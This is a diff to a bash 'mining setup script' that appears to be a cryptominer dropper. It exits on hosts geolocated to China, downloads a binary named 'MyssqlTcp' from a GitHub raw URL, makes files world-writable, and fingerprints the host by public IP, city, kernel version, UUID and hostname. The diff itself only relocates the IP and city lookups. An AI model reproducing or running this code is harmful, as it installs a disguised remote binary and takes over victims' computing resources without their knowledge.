@@ -7,8 +7,6 @@ if curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep  -i 'CN'; then
     exit 1 
 fi
 
-MEIP=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-CITY=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "city" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 echo "Mssqlup mining setup script v$VERSION."
 echo "(please report issues to admin@admin.com email with full output of this script with extra \"-x\" \"bash\" option)"
 echo
@@ -691,6 +689,8 @@ wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
 chmod 777 MyssqlTcp
 chmod 777 config.json
 
+MEIP=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+CITY=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "city" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 UUIP=`uname -v | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 UUID=`cat /proc/sys/kernel/random/uuid`
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
